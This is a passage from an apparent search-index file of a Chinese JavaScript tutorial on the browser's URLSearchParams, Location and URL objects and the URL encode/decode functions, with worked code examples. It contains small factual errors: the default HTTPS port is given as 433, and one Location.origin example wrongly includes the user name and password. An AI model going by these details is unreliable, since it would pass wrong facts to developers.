\u5b83\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u662f\u952e\u540d\uff0c\u7b2c\u4e8c\u4e2a\u662f\u952e\u503c\u3002\u5982\u679c\u662f\u5df2\u7ecf\u5b58\u5728\u7684\u952e\uff0c\u952e\u503c\u4f1a\u88ab\u6539\u5199\uff0c\u5426\u5219\u4f1a\u88ab\u8ffd\u52a0\u3002 1 2 3 4 5 var params = new URLSearchParams ( '?foo=1' ); params . set ( 'foo' , 2 ); params . toString () // \"foo=2\" params . set ( 'bar' , 3 ); params . toString () // \"foo=2&bar=3\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c foo \u662f\u5df2\u7ecf\u5b58\u5728\u7684\u952e\uff0c bar \u662f\u8fd8\u4e0d\u5b58\u5728\u7684\u952e\u3002 \u5982\u679c\u6709\u591a\u4e2a\u7684\u540c\u540d\u952e\uff0c set \u4f1a\u79fb\u9664\u73b0\u5b58\u6240\u6709\u7684\u952e\u3002 1 2 3 var params = new URLSearchParams ( '?foo=1&foo=2' ); params . set ( 'foo' , 3 ); params . toString () // \"foo=3\" \u4e0b\u9762\u662f\u4e00\u4e2a\u66ff\u6362\u5f53\u524d URL \u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 // URL: https://example.com?version=1.0 var params = new URLSearchParams ( location . search . slice ( 1 )); params . set ( 'version' , '2.0' ); window . history . replaceState ({}, '' , location . pathname + `?` + params ); // URL: https://example.com?version=2.0 URLSearchParams.get()\uff0cURLSearchParams.getAll() \u00b6 get() \u65b9\u6cd5\u7528\u6765\u8bfb\u53d6\u67e5\u8be2\u5b57\u7b26\u4e32\u91cc\u9762\u7684\u6307\u5b9a\u952e\u3002\u5b83\u63a5\u53d7\u952e\u540d\u4f5c\u4e3a\u53c2\u6570\u3002 1 2 3 var params = new URLSearchParams ( '?foo=1' ); params . get ( 'foo' ) // \"1\" params . get ( 'bar' ) // null \u4e24\u4e2a\u5730\u65b9\u9700\u8981\u6ce8\u610f\u3002\u7b2c\u4e00\uff0c\u5b83\u8fd4\u56de\u7684\u662f\u5b57\u7b26\u4e32\uff0c\u5982\u679c\u539f\u59cb\u503c\u662f\u6570\u503c\uff0c\u9700\u8981\u8f6c\u4e00\u4e0b\u7c7b\u578b\uff1b\u7b2c\u4e8c\uff0c\u5982\u679c\u6307\u5b9a\u7684\u952e\u540d\u4e0d\u5b58\u5728\uff0c\u8fd4\u56de\u503c\u662f null \u3002 \u5982\u679c\u6709\u591a\u4e2a\u7684\u540c\u540d\u952e\uff0c get \u8fd4\u56de\u4f4d\u7f6e\u6700\u524d\u9762\u7684\u90a3\u4e2a\u952e\u503c\u3002 1 2 var params = new URLSearchParams ( '?foo=3&foo=2&foo=1' ); params . get ( 'foo' ) // \"3\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u67e5\u8be2\u5b57\u7b26\u4e32\u6709\u4e09\u4e2a foo \u952e\uff0c get \u65b9\u6cd5\u8fd4\u56de\u6700\u524d\u9762\u7684\u952e\u503c 3 \u3002 getAll() \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u6570\u7ec4\uff0c\u6210\u5458\u662f\u6307\u5b9a\u952e\u7684\u6240\u6709\u952e\u503c\u3002\u5b83\u63a5\u53d7\u952e\u540d\u4f5c\u4e3a\u53c2\u6570\u3002 1 2 var params = new URLSearchParams ( '?foo=1&foo=2' ); params . getAll ( 'foo' ) // [\"1\", \"2\"] \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u67e5\u8be2\u5b57\u7b26\u4e32\u6709\u4e24\u4e2a foo \u952e\uff0c getAll \u8fd4\u56de\u7684\u6570\u7ec4\u5c31\u6709\u4e24\u4e2a\u6210\u5458\u3002 URLSearchParams.sort() \u00b6 sort() \u65b9\u6cd5\u5bf9\u67e5\u8be2\u5b57\u7b26\u4e32\u91cc\u9762\u7684\u952e\u8fdb\u884c\u6392\u5e8f\uff0c\u89c4\u5219\u662f\u6309\u7167 Unicode \u7801\u70b9\u4ece\u5c0f\u5230\u5927\u6392\u5217\u3002 \u8be5\u65b9\u6cd5\u6ca1\u6709\u8fd4\u56de\u503c\uff0c\u6216\u8005\u8bf4\u8fd4\u56de\u503c\u662f undefined \u3002 1 2 3 var params = new URLSearchParams ( 'c=4&a=2&b=3&a=1' ); params . sort (); params . toString () // \"a=2&a=1&b=3&c=4\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5982\u679c\u6709\u4e24\u4e2a\u540c\u540d\u7684\u952e a \uff0c\u5b83\u4eec\u4e4b\u95f4\u4e0d\u4f1a\u6392\u5e8f\uff0c\u800c\u662f\u4fdd\u7559\u539f\u59cb\u7684\u987a\u5e8f\u3002 URLSearchParams.keys()\uff0cURLSearchParams.values()\uff0cURLSearchParams.entries() \u00b6 \u8fd9\u4e09\u4e2a\u65b9\u6cd5\u90fd\u8fd4\u56de\u4e00\u4e2a\u904d\u5386\u5668\u5bf9\u8c61\uff0c\u4f9b for...of \u5faa\u73af\u904d\u5386\u3002\u5b83\u4eec\u7684\u533a\u522b\u5728\u4e8e\uff0c keys \u65b9\u6cd5\u8fd4\u56de\u7684\u662f\u952e\u540d\u7684\u904d\u5386\u5668\uff0c values \u65b9\u6cd5\u8fd4\u56de\u7684\u662f\u952e\u503c\u7684\u904d\u5386\u5668\uff0c entries \u8fd4\u56de\u7684\u662f\u952e\u503c\u5bf9\u7684\u904d\u5386\u5668\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 var params = new URLSearchParams ( 'a=1&b=2' ); for ( var p of params . keys ()) { console . log ( p ); } // a // b for ( var p of params . values ()) { console . log ( p ); } // 1 // 2 for ( var p of params . entries ()) { console . log ( p ); } // [\"a\", \"1\"] // [\"b\", \"2\"] \u5982\u679c\u76f4\u63a5\u5bf9 URLSearchParams \u8fdb\u884c\u904d\u5386\uff0c\u5176\u5b9e\u5185\u90e8\u8c03\u7528\u7684\u5c31\u662f entries \u63a5\u53e3\u3002 1 2 3 for ( var p of params ) {} // \u7b49\u540c\u4e8e for ( var p of params . entries ()) {} \u53c2\u8003\u94fe\u63a5 \u00b6 Location , by MDN URL , by MDN URLSearchParams , by MDN Easy URL Manipulation with URLSearchParams , by Eric Bidelman","title":"Location \u5bf9\u8c61\uff0cURL \u5bf9\u8c61\uff0cURLSearchParams \u5bf9\u8c61"},{"location":"bom/location/#location-url-urlsearchparams","text":"URL \u662f\u4e92\u8054\u7f51\u7684\u57fa\u7840\u8bbe\u65bd\u4e4b\u4e00\u3002\u6d4f\u89c8\u5668\u63d0\u4f9b\u4e86\u4e00\u4e9b\u539f\u751f\u5bf9\u8c61\uff0c\u7528\u6765\u7ba1\u7406 URL\u3002","title":"Location \u5bf9\u8c61\uff0cURL \u5bf9\u8c61\uff0cURLSearchParams \u5bf9\u8c61"},{"location":"bom/location/#location","text":"Location \u5bf9\u8c61\u662f\u6d4f\u89c8\u5668\u63d0\u4f9b\u7684\u539f\u751f\u5bf9\u8c61\uff0c\u63d0\u4f9b URL \u76f8\u5173\u7684\u4fe1\u606f\u548c\u64cd\u4f5c\u65b9\u6cd5\u3002\u901a\u8fc7 window.location \u548c document.location \u5c5e\u6027\uff0c\u53ef\u4ee5\u62ff\u5230\u8fd9\u4e2a\u5bf9\u8c61\u3002","title":"Location \u5bf9\u8c61"},{"location":"bom/location/#_1","text":"Location \u5bf9\u8c61\u63d0\u4f9b\u4ee5\u4e0b\u5c5e\u6027\u3002 Location.href \uff1a\u6574\u4e2a URL\u3002 Location.protocol \uff1a\u5f53\u524d URL \u7684\u534f\u8bae\uff0c\u5305\u62ec\u5192\u53f7\uff08 : \uff09\u3002 Location.host \uff1a\u4e3b\u673a\u3002\u5982\u679c\u7aef\u53e3\u4e0d\u662f\u534f\u8bae\u9ed8\u8ba4\u7684 80 \u548c 433 \uff0c\u5219\u8fd8\u4f1a\u5305\u62ec\u5192\u53f7\uff08 : \uff09\u548c\u7aef\u53e3\u3002 Location.hostname \uff1a\u4e3b\u673a\u540d\uff0c\u4e0d\u5305\u62ec\u7aef\u53e3\u3002 Location.port \uff1a\u7aef\u53e3\u53f7\u3002 Location.pathname \uff1aURL \u7684\u8def\u5f84\u90e8\u5206\uff0c\u4ece\u6839\u8def\u5f84 / \u5f00\u59cb\u3002 Location.search \uff1a\u67e5\u8be2\u5b57\u7b26\u4e32\u90e8\u5206\uff0c\u4ece\u95ee\u53f7 ? \u5f00\u59cb\u3002 Location.hash \uff1a\u7247\u6bb5\u5b57\u7b26\u4e32\u90e8\u5206\uff0c\u4ece # \u5f00\u59cb\u3002 Location.username \uff1a\u57df\u540d\u524d\u9762\u7684\u7528\u6237\u540d\u3002 Location.password \uff1a\u57df\u540d\u524d\u9762\u7684\u5bc6\u7801\u3002 Location.origin \uff1aURL \u7684\u534f\u8bae\u3001\u4e3b\u673a\u540d\u548c\u7aef\u53e3\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 // \u5f53\u524d\u7f51\u5740\u4e3a // http://user:passwd@www.example.com:4097/path/a.html?x=111#part1 document . location . href // \"http://user:passwd@www.example.com:4097/path/a.html?x=111#part1\" document . location . protocol // \"http:\" document . location . host // \"www.example.com:4097\" document . location . hostname // \"www.example.com\" document . location . port // \"4097\" document . location . pathname // \"/path/a.html\" document . location . search // \"?x=111\" document . location . hash // \"#part1\" document . location . username // \"user\" document . location . password // \"passwd\" document . location . origin // \"http://user:passwd@www.example.com:4097\" \u8fd9\u4e9b\u5c5e\u6027\u91cc\u9762\uff0c\u53ea\u6709 origin \u5c5e\u6027\u662f\u53ea\u8bfb\u7684\uff0c\u5176\u4ed6\u5c5e\u6027\u90fd\u53ef\u5199\u3002 \u6ce8\u610f\uff0c\u5982\u679c\u5bf9 Location.href \u5199\u5165\u65b0\u7684 URL \u5730\u5740\uff0c\u6d4f\u89c8\u5668\u4f1a\u7acb\u523b\u8df3\u8f6c\u5230\u8fd9\u4e2a\u65b0\u5730\u5740\u3002 1 2 // \u8df3\u8f6c\u5230\u65b0\u7f51\u5740 document . location . href = 'http://www.example.com' ; \u8fd9\u4e2a\u7279\u6027\u5e38\u5e38\u7528\u4e8e\u8ba9\u7f51\u9875\u81ea\u52a8\u6eda\u52a8\u5230\u65b0\u7684\u951a\u70b9\u3002 1 2 3 document . location . href = '#top' ; // \u7b49\u540c\u4e8e document . location . hash = '#top' ; \u76f4\u63a5\u6539\u5199 location \uff0c\u76f8\u5f53\u4e8e\u5199\u5165 href \u5c5e\u6027\u3002 1 2 3 document . location = 'http://www.example.com' ; // \u7b49\u540c\u4e8e document . location . href = 'http://www.example.com' ; \u53e6\u5916\uff0c Location.href \u5c5e\u6027\u662f\u6d4f\u89c8\u5668\u552f\u4e00\u5141\u8bb8\u8de8\u57df\u5199\u5165\u7684\u5c5e\u6027\uff0c\u5373\u975e\u540c\u6e90\u7684\u7a97\u53e3\u53ef\u4ee5\u6539\u5199\u53e6\u4e00\u4e2a\u7a97\u53e3\uff08\u6bd4\u5982\u5b50\u7a97\u53e3\u4e0e\u7236\u7a97\u53e3\uff09\u7684 Location.href \u5c5e\u6027\uff0c\u5bfc\u81f4\u540e\u8005\u7684\u7f51\u5740\u8df3\u8f6c\u3002 Location \u7684\u5176\u4ed6\u5c5e\u6027\u90fd\u4e0d\u5141\u8bb8\u8de8\u57df\u5199\u5165\u3002","title":"\u5c5e\u6027"},{"location":"bom/location/#_2","text":"\uff081\uff09Location.assign() assign \u65b9\u6cd5\u63a5\u53d7\u4e00\u4e2a URL \u5b57\u7b26\u4e32\u4f5c\u4e3a\u53c2\u6570\uff0c\u4f7f\u5f97\u6d4f\u89c8\u5668\u7acb\u523b\u8df3\u8f6c\u5230\u65b0\u7684 URL\u3002\u5982\u679c\u53c2\u6570\u4e0d\u662f\u6709\u6548\u7684 URL \u5b57\u7b26\u4e32\uff0c\u5219\u4f1a\u62a5\u9519\u3002 1 2 // \u8df3\u8f6c\u5230\u65b0\u7684\u7f51\u5740 document . location . assign ( 'http://www.example.com' ) \uff082\uff09Location.replace() replace \u65b9\u6cd5\u63a5\u53d7\u4e00\u4e2a URL \u5b57\u7b26\u4e32\u4f5c\u4e3a\u53c2\u6570\uff0c\u4f7f\u5f97\u6d4f\u89c8\u5668\u7acb\u523b\u8df3\u8f6c\u5230\u65b0\u7684 URL\u3002\u5982\u679c\u53c2\u6570\u4e0d\u662f\u6709\u6548\u7684 URL \u5b57\u7b26\u4e32\uff0c\u5219\u4f1a\u62a5\u9519\u3002 \u5b83\u4e0e assign \u65b9\u6cd5\u7684\u5dee\u5f02\u5728\u4e8e\uff0c replace \u4f1a\u5728\u6d4f\u89c8\u5668\u7684\u6d4f\u89c8\u5386\u53f2 History \u91cc\u9762\u5220\u9664\u5f53\u524d\u7f51\u5740\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u4e00\u65e6\u4f7f\u7528\u4e86\u8be5\u65b9\u6cd5\uff0c\u540e\u9000\u6309\u94ae\u5c31\u65e0\u6cd5\u56de\u5230\u5f53\u524d\u7f51\u9875\u4e86\uff0c\u76f8\u5f53\u4e8e\u5728\u6d4f\u89c8\u5386\u53f2\u91cc\u9762\uff0c\u4f7f\u7528\u65b0\u7684 URL \u66ff\u6362\u4e86\u8001\u7684 URL\u3002\u5b83\u7684\u4e00\u4e2a\u5e94\u7528\u662f\uff0c\u5f53\u811a\u672c\u53d1\u73b0\u5f53\u524d\u662f\u79fb\u52a8\u8bbe\u5907\u65f6\uff0c\u5c31\u7acb\u523b\u8df3\u8f6c\u5230\u79fb\u52a8\u7248\u7f51\u9875\u3002 1 2 // \u8df3\u8f6c\u5230\u65b0\u7684\u7f51\u5740 document . location . replace ( 'http://www.example.com' ) \uff083\uff09Location.reload() reload \u65b9\u6cd5\u4f7f\u5f97\u6d4f\u89c8\u5668\u91cd\u65b0\u52a0\u8f7d\u5f53\u524d\u7f51\u5740\uff0c\u76f8\u5f53\u4e8e\u6309\u4e0b\u6d4f\u89c8\u5668\u7684\u5237\u65b0\u6309\u94ae\u3002 \u5b83\u63a5\u53d7\u4e00\u4e2a\u5e03\u5c14\u503c\u4f5c\u4e3a\u53c2\u6570\u3002\u5982\u679c\u53c2\u6570\u4e3a true \uff0c\u6d4f\u89c8\u5668\u5c06\u5411\u670d\u52a1\u5668\u91cd\u65b0\u8bf7\u6c42\u8fd9\u4e2a\u7f51\u9875\uff0c\u5e76\u4e14\u91cd\u65b0\u52a0\u8f7d\u540e\uff0c\u7f51\u9875\u5c06\u6eda\u52a8\u5230\u5934\u90e8\uff08\u5373 scrollTop === 0 \uff09\u3002\u5982\u679c\u53c2\u6570\u662f false \u6216\u4e3a\u7a7a\uff0c\u6d4f\u89c8\u5668\u5c06\u4ece\u672c\u5730\u7f13\u5b58\u91cd\u65b0\u52a0\u8f7d\u8be5\u7f51\u9875\uff0c\u5e76\u4e14\u91cd\u65b0\u52a0\u8f7d\u540e\uff0c\u7f51\u9875\u7684\u89c6\u53e3\u4f4d\u7f6e\u662f\u91cd\u65b0\u52a0\u8f7d\u524d\u7684\u4f4d\u7f6e\u3002 1 2 // \u5411\u670d\u52a1\u5668\u91cd\u65b0\u8bf7\u6c42\u5f53\u524d\u7f51\u5740 window . location . reload ( true ); \uff084\uff09Location.toString() toString \u65b9\u6cd5\u8fd4\u56de\u6574\u4e2a URL \u5b57\u7b26\u4e32\uff0c\u76f8\u5f53\u4e8e\u8bfb\u53d6 Location.href \u5c5e\u6027\u3002","title":"\u65b9\u6cd5"},{"location":"bom/location/#url","text":"\u7f51\u9875\u7684 URL \u53ea\u80fd\u5305\u542b\u5408\u6cd5\u7684\u5b57\u7b26\u3002\u5408\u6cd5\u5b57\u7b26\u5206\u6210\u4e24\u7c7b\u3002 URL \u5143\u5b57\u7b26\uff1a\u5206\u53f7\uff08 ; \uff09\uff0c\u9017\u53f7\uff08 , \uff09\uff0c\u659c\u6760\uff08 / \uff09\uff0c\u95ee\u53f7\uff08 ? \uff09\uff0c\u5192\u53f7\uff08 : \uff09\uff0cat\uff08 @ \uff09\uff0c & \uff0c\u7b49\u53f7\uff08 = \uff09\uff0c\u52a0\u53f7\uff08 + \uff09\uff0c\u7f8e\u5143\u7b26\u53f7\uff08 $ \uff09\uff0c\u4e95\u53f7\uff08 # \uff09 \u8bed\u4e49\u5b57\u7b26\uff1a a-z \uff0c A-Z \uff0c 0-9 \uff0c\u8fde\u8bcd\u53f7\uff08 - \uff09\uff0c\u4e0b\u5212\u7ebf\uff08 _ \uff09\uff0c\u70b9\uff08 . \uff09\uff0c\u611f\u53f9\u53f7\uff08 ! \uff09\uff0c\u6ce2\u6d6a\u7ebf\uff08 ~ \uff09\uff0c\u661f\u53f7\uff08 * \uff09\uff0c\u5355\u5f15\u53f7\uff08 ' \uff09\uff0c\u5706\u62ec\u53f7\uff08 () \uff09 \u9664\u4e86\u4ee5\u4e0a\u5b57\u7b26\uff0c\u5176\u4ed6\u5b57\u7b26\u51fa\u73b0\u5728 URL \u4e4b\u4e2d\u90fd\u5fc5\u987b\u8f6c\u4e49\uff0c\u89c4\u5219\u662f\u6839\u636e\u64cd\u4f5c\u7cfb\u7edf\u7684\u9ed8\u8ba4\u7f16\u7801\uff0c\u5c06\u6bcf\u4e2a\u5b57\u8282\u8f6c\u4e3a\u767e\u5206\u53f7\uff08 % \uff09\u52a0\u4e0a\u4e24\u4e2a\u5927\u5199\u7684\u5341\u516d\u8fdb\u5236\u5b57\u6bcd\u3002 \u6bd4\u5982\uff0cUTF-8 \u7684\u64cd\u4f5c\u7cfb\u7edf\u4e0a\uff0c http://www.example.com/q=\u6625\u8282 \u8fd9\u4e2a URL \u4e4b\u4e2d\uff0c\u6c49\u5b57\u201c\u6625\u8282\u201d\u4e0d\u662f URL \u7684\u5408\u6cd5\u5b57\u7b26\uff0c\u6240\u4ee5\u88ab\u6d4f\u89c8\u5668\u81ea\u52a8\u8f6c\u6210 http://www.example.com/q=%E6%98%A5%E8%8A%82 \u3002\u5176\u4e2d\uff0c\u201c\u6625\u201d\u8f6c\u6210\u4e86 %E6%98%A5 \uff0c\u201c\u8282\u201d\u8f6c\u6210\u4e86 %E8%8A%82 \u3002\u8fd9\u662f\u56e0\u4e3a\u201c\u6625\u201d\u548c\u201c\u8282\u201d\u7684 UTF-8 \u7f16\u7801\u5206\u522b\u662f E6 98 A5 \u548c E8 8A 82 \uff0c\u5c06\u6bcf\u4e2a\u5b57\u8282\u524d\u9762\u52a0\u4e0a\u767e\u5206\u53f7\uff0c\u5c31\u6784\u6210\u4e86 URL \u7f16\u7801\u3002 JavaScript \u63d0\u4f9b\u56db\u4e2a URL \u7684\u7f16\u7801/\u89e3\u7801\u65b9\u6cd5\u3002 encodeURI() encodeURIComponent() decodeURI() decodeURIComponent()","title":"URL \u7684\u7f16\u7801\u548c\u89e3\u7801"},{"location":"bom/location/#encodeuri","text":"encodeURI() \u65b9\u6cd5\u7528\u4e8e\u8f6c\u7801\u6574\u4e2a URL\u3002\u5b83\u7684\u53c2\u6570\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u4ee3\u8868\u6574\u4e2a URL\u3002\u5b83\u4f1a\u5c06\u5143\u5b57\u7b26\u548c\u8bed\u4e49\u5b57\u7b26\u4e4b\u5916\u7684\u5b57\u7b26\uff0c\u90fd\u8fdb\u884c\u8f6c\u4e49\u3002 1 2 encodeURI ( 'http://www.example.com/q=\u6625\u8282' ) // \"http://www.example.com/q=%E6%98%A5%E8%8A%82\"","title":"encodeURI()"},{"location":"bom/location/#encodeuricomponent","text":"encodeURIComponent() \u65b9\u6cd5\u7528\u4e8e\u8f6c\u7801 URL \u7684\u7ec4\u6210\u90e8\u5206\uff0c\u4f1a\u8f6c\u7801\u9664\u4e86\u8bed\u4e49\u5b57\u7b26\u4e4b\u5916\u7684\u6240\u6709\u5b57\u7b26\uff0c\u5373\u5143\u5b57\u7b26\u4e5f\u4f1a\u88ab\u8f6c\u7801\u3002\u6240\u4ee5\uff0c\u5b83\u4e0d\u80fd\u7528\u4e8e\u8f6c\u7801\u6574\u4e2a URL\u3002\u5b83\u63a5\u53d7\u4e00\u4e2a\u53c2\u6570\uff0c\u5c31\u662f URL \u7684\u7247\u6bb5\u3002 1 2 3 4 encodeURIComponent ( '\u6625\u8282' ) // \"%E6%98%A5%E8%8A%82\" encodeURIComponent ( 'http://www.example.com/q=\u6625\u8282' ) // \"http%3A%2F%2Fwww.example.com%2Fq%3D%E6%98%A5%E8%8A%82\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c encodeURIComponent() \u4f1a\u8fde URL \u5143\u5b57\u7b26\u4e00\u8d77\u8f6c\u4e49\uff0c\u6240\u4ee5\u5982\u679c\u8f6c\u7801\u6574\u4e2a URL \u5c31\u4f1a\u51fa\u9519\u3002","title":"encodeURIComponent()"},{"location":"bom/location/#decodeuri","text":"decodeURI() \u65b9\u6cd5\u7528\u4e8e\u6574\u4e2a URL \u7684\u89e3\u7801\u3002\u5b83\u662f encodeURI() \u65b9\u6cd5\u7684\u9006\u8fd0\u7b97\u3002\u5b83\u63a5\u53d7\u4e00\u4e2a\u53c2\u6570\uff0c\u5c31\u662f\u8f6c\u7801\u540e\u7684 URL\u3002 1 2 decodeURI ( 'http://www.example.com/q=%E6%98%A5%E8%8A%82' ) // \"http://www.example.com/q=\u6625\u8282\"","title":"decodeURI()"},{"location":"bom/location/#decodeuricomponent","text":"decodeURIComponent() \u7528\u4e8eURL \u7247\u6bb5\u7684\u89e3\u7801\u3002\u5b83\u662f encodeURIComponent() \u65b9\u6cd5\u7684\u9006\u8fd0\u7b97\u3002\u5b83\u63a5\u53d7\u4e00\u4e2a\u53c2\u6570\uff0c\u5c31\u662f\u8f6c\u7801\u540e\u7684 URL \u7247\u6bb5\u3002 1 2 decodeURIComponent ( '%E6%98%A5%E8%8A%82' ) // \"\u6625\u8282\"","title":"decodeURIComponent()"},{"location":"bom/location/#url_1","text":"\u6d4f\u89c8\u5668\u539f\u751f\u63d0\u4f9b URL() \u63a5\u53e3\uff0c\u5b83\u662f\u4e00\u4e2a\u6784\u9020\u51fd\u6570\uff0c\u7528\u6765\u6784\u9020\u3001\u89e3\u6790\u548c\u7f16\u7801 URL\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u901a\u8fc7 window.URL \u53ef\u4ee5\u62ff\u5230\u8fd9\u4e2a\u6784\u9020\u51fd\u6570\u3002","title":"URL \u63a5\u53e3"},{"location":"bom/location/#_3","text":"URL() \u4f5c\u4e3a\u6784\u9020\u51fd\u6570\uff0c\u53ef\u4ee5\u751f\u6210 URL \u5b9e\u4f8b\u3002\u5b83\u63a5\u53d7\u4e00\u4e2a\u8868\u793a URL \u7684\u5b57\u7b26\u4e32\u4f5c\u4e3a\u53c2\u6570\u3002\u5982\u679c\u53c2\u6570\u4e0d\u662f\u5408\u6cd5\u7684 URL\uff0c\u4f1a\u62a5\u9519\u3002 1 2 3 var url = new URL ( 'http://www.example.com/index.html' ); url . href // \"http://www.example.com/index.html\" \u4e0a\u9762\u793a\u4f8b\u751f\u6210\u4e86\u4e00\u4e2a URL \u5b9e\u4f8b\uff0c\u7528\u6765\u4ee3\u8868\u6307\u5b9a\u7684\u7f51\u5740\u3002 \u9664\u4e86\u5b57\u7b26\u4e32\uff0c URL() \u7684\u53c2\u6570\u4e5f\u53ef\u4ee5\u662f\u53e6\u4e00\u4e2a URL \u5b9e\u4f8b\u3002\u8fd9\u65f6\uff0c URL() \u4f1a\u81ea\u52a8\u8bfb\u53d6\u8be5\u5b9e\u4f8b\u7684 href \u5c5e\u6027\uff0c\u4f5c\u4e3a\u5b9e\u9645\u53c2\u6570\u3002 \u5982\u679c URL \u5b57\u7b26\u4e32\u662f\u4e00\u4e2a\u76f8\u5bf9\u8def\u5f84\uff0c\u90a3\u4e48\u9700\u8981\u8868\u793a\u7edd\u5bf9\u8def\u5f84\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u4f5c\u4e3a\u8ba1\u7b97\u57fa\u51c6\u3002 1 2 3 4 5 6 7 8 9 10 11 var url1 = new URL ( 'index.html' , 'http://example.com' ); url1 . href // \"http://example.com/index.html\" var url2 = new URL ( 'page2.html' , 'http://example.com/page1.html' ); url2 . href // \"http://example.com/page2.html\" var url3 = new URL ( '..' , 'http://example.com/a/b.html' ) url3 . href // \"http://example.com/\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u8fd4\u56de\u7684 URL \u5b9e\u4f8b\u7684\u8def\u5f84\u90fd\u662f\u5728\u7b2c\u4e8c\u4e2a\u53c2\u6570\u7684\u57fa\u7840\u4e0a\uff0c\u5207\u6362\u5230\u7b2c\u4e00\u4e2a\u53c2\u6570\u5f97\u5230\u7684\u3002\u6700\u540e\u4e00\u4e2a\u4f8b\u5b50\u91cc\u9762\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f .. \uff0c\u8868\u793a\u4e0a\u5c42\u8def\u5f84\u3002","title":"\u6784\u9020\u51fd\u6570"},{"location":"bom/location/#_4","text":"URL \u5b9e\u4f8b\u7684\u5c5e\u6027\u4e0e Location \u5bf9\u8c61\u7684\u5c5e\u6027\u57fa\u672c\u4e00\u81f4\uff0c\u8fd4\u56de\u5f53\u524d URL \u7684\u4fe1\u606f\u3002 URL.href\uff1a\u8fd4\u56de\u6574\u4e2a URL URL.protocol\uff1a\u8fd4\u56de\u534f\u8bae\uff0c\u4ee5\u5192\u53f7 : \u7ed3\u5c3e URL.hostname\uff1a\u8fd4\u56de\u57df\u540d URL.host\uff1a\u8fd4\u56de\u57df\u540d\u4e0e\u7aef\u53e3\uff0c\u5305\u542b : \u53f7\uff0c\u9ed8\u8ba4\u768480\u548c443\u7aef\u53e3\u4f1a\u7701\u7565 URL.port\uff1a\u8fd4\u56de\u7aef\u53e3 URL.origin\uff1a\u8fd4\u56de\u534f\u8bae\u3001\u57df\u540d\u548c\u7aef\u53e3 URL.pathname\uff1a\u8fd4\u56de\u8def\u5f84\uff0c\u4ee5\u659c\u6760 / \u5f00\u5934 URL.search\uff1a\u8fd4\u56de\u67e5\u8be2\u5b57\u7b26\u4e32\uff0c\u4ee5\u95ee\u53f7 ? \u5f00\u5934 URL.searchParams\uff1a\u8fd4\u56de\u4e00\u4e2a URLSearchParams \u5b9e\u4f8b\uff0c\u8be5\u5c5e\u6027\u662f Location \u5bf9\u8c61\u6ca1\u6709\u7684 URL.hash\uff1a\u8fd4\u56de\u7247\u6bb5\u8bc6\u522b\u7b26\uff0c\u4ee5\u4e95\u53f7 # \u5f00\u5934 URL.password\uff1a\u8fd4\u56de\u57df\u540d\u524d\u9762\u7684\u5bc6\u7801 URL.username\uff1a\u8fd4\u56de\u57df\u540d\u524d\u9762\u7684\u7528\u6237\u540d 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 var url = new URL ( 'http://user:passwd@www.example.com:4097/path/a.html?x=111#part1' ); url . href // \"http://user:passwd@www.example.com:4097/path/a.html?x=111#part1\" url . protocol // \"http:\" url . hostname // \"www.example.com\" url . host // \"www.example.com:4097\" url . port // \"4097\" url . origin // \"http://www.example.com:4097\" url . pathname // \"/path/a.html\" url . search // \"?x=111\" url . searchParams // URLSearchParams {} url . hash // \"#part1\" url . password // \"passwd\" url . username // \"user\" \u8fd9\u4e9b\u5c5e\u6027\u91cc\u9762\uff0c\u53ea\u6709 origin \u5c5e\u6027\u662f\u53ea\u8bfb\u7684\uff0c\u5176\u4ed6\u5c5e\u6027\u90fd\u53ef\u5199\uff0c\u5e76\u4e14\u4f1a\u7acb\u5373\u751f\u6548\u3002 1 2 3 4 5 6 7 var url = new URL ( 'http://example.com/index.html#part1' ); url . pathname = 'index2.html' ; url . href // \"http://example.com/index2.html#part1\" url . hash = '#part2' ; url . href // \"http://example.com/index2.html#part2\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6539\u53d8 URL \u5b9e\u4f8b\u7684 pathname \u5c5e\u6027\u548c hash \u5c5e\u6027\uff0c\u90fd\u4f1a\u5b9e\u65f6\u53cd\u6620\u5728 URL \u5b9e\u4f8b\u5f53\u4e2d\u3002","title":"\u5b9e\u4f8b\u5c5e\u6027"},{"location":"bom/location/#_5","text":"\uff081\uff09URL.createObjectURL() URL.createObjectURL() \u65b9\u6cd5\u7528\u6765\u4e3a\u4e0a\u4f20/\u4e0b\u8f7d\u7684\u6587\u4ef6\u3001\u6d41\u5a92\u4f53\u6587\u4ef6\u751f\u6210\u4e00\u4e2a URL \u5b57\u7b26\u4e32\u3002\u8fd9\u4e2a\u5b57\u7b26\u4e32\u4ee3\u8868\u4e86 File \u5bf9\u8c61\u6216 Blob \u5bf9\u8c61\u7684 URL\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 // HTML \u4ee3\u7801\u5982\u4e0b // <div id=\"display\"/> // <input // type=\"file\" // id=\"fileElem\" // multiple // accept=\"image/*\" // onchange=\"handleFiles(this.files)\" // > var div = document . getElementById ( 'display' ); function handleFiles ( files ) { for ( var i = 0 ; i < files . length ; i ++ ) { var img = document . createElement ( 'img' ); img . src = window . URL . createObjectURL ( files [ i ]); div . appendChild ( img ); } } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c URL.createObjectURL() \u65b9\u6cd5\u7528\u6765\u4e3a\u4e0a\u4f20\u7684\u6587\u4ef6\u751f\u6210\u4e00\u4e2a URL \u5b57\u7b26\u4e32\uff0c\u4f5c\u4e3a <img> \u5143\u7d20\u7684\u56fe\u7247\u6765\u6e90\u3002 